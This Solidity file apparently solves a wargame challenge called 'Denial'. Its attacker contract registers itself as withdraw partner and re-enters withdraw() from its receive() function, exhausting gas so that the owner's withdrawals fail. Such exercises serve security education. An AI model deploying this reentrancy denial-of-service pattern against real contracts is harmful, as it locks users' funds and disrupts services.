// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";
import "./DenialFactory.sol";

contract DenialAttack {
    DenialFactory public denialFactory;
    Denial public denial;

    constructor(address payable _denialFactory) payable {
        denialFactory = DenialFactory(_denialFactory);
        address _denial = denialFactory.createInstance{value: msg.value}(msg.sender);
        denial = Denial(payable(_denial));
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

    receive() external payable {
        denial.withdraw();
    }
}
